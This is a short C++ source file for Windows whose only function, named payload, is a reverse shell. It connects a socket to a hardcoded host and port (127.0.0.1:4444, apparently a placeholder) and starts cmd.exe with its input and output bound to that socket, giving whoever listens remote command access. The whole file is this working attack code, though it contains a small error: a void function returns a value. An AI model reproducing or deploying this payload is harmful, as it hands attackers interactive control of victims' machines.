#include <Winsock2.h>
#include <Windows.h>
#include <iostream>
#include "payload.h"


void payload ()
{
std::string rem_host = "127.0.0.1";
int rem_port = 4444;

WSADATA wsaData;

// Call WSAStartup()
int WSAStartup_Result = WSAStartup(MAKEWORD(2,2), &wsaData);
if (WSAStartup_Result != 0) {
    return 1;
}

// Call WSASocket()
SOCKET mysocket = WSASocketA(2, 1, 6, NULL, 0, NULL);

// Create sockaddr_in struct
struct sockaddr_in sa;
sa.sin_family = AF_INET;
sa.sin_addr.s_addr = inet_addr(rem_host.c_str());
sa.sin_port = htons(rem_port);

// Call connect()
int connect_Result = connect(mysocket, (struct sockaddr*) &sa, sizeof(sa));
if (connect_Result !=0 ) {
    return 1;
}
// Call CreateProcessA()
STARTUPINFO si;
memset(&si, 0, sizeof(si));
si.cb = sizeof(si);
si.dwFlags = (STARTF_USESTDHANDLES);
si.hStdInput = (HANDLE)mysocket;
si.hStdOutput = (HANDLE)mysocket;
si.hStdError = (HANDLE)mysocket;
PROCESS_INFORMATION pi;
CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}